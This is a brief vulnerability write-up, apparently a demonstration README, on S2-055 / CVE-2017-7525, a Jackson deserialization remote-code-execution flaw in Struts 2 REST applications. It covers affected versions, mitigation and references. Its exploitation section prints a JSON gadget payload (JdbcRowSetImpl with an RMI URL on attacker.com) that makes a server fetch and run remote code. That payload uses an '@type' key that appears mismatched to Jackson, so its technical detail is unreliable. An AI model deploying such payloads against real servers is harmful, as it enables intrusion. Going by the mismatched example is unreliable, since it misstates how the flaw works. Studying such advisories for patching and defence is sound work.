# S2-055: CVE-2017-7525 Vulnerability Demonstration

## Overview
CVE-2017-7525 is a Remote Code Execution (RCE) vulnerability in the Jackson JSON library. This vulnerability can be exploited by sending a crafted JSON payload to an application using the Struts 2 REST plugin. The vulnerability arises from unsafe deserialization of JSON data.

## Affected Versions
- Apache Struts 2.5 to 2.5.14

## Exploitation Example

The following steps demonstrate how this vulnerability can be exploited:

1. **Setup**: Ensure the application uses the Struts 2 REST plugin and a vulnerable version of the Jackson JSON library (e.g., versions prior to 2.9.2).

2. **Crafted Payload**: An attacker sends a malicious JSON payload to the server. For example:

   ```json
   {
       "@type": "com.sun.rowset.JdbcRowSetImpl",
       "dataSourceName": "rmi://attacker.com:1099/Exploit",
       "autoCommit": true
   }
   ```

   This payload exploits the unsafe deserialization in the Jackson library to execute arbitrary code.

3. **Result**: The server processes the payload, leading to the execution of the attacker's code.

## Mitigation
To mitigate this vulnerability:
1. Upgrade to Apache Struts version 2.5.14.1.
2. Manually update the Jackson JSON library to version 2.9.2 or later.
3. Avoid using unsafe deserialization in your application.

## Important Notes
- This example is for educational purposes only. Do not use this information for malicious activities.
- Always validate and sanitize user inputs to prevent exploitation.

## References
- [Apache Struts Security Bulletin S2-055](https://cwiki.apache.org/confluence/display/WW/S2-055)
- [Jackson Databind Issue #1599](https://github.com/FasterXML/jackson-databind/issues/1599)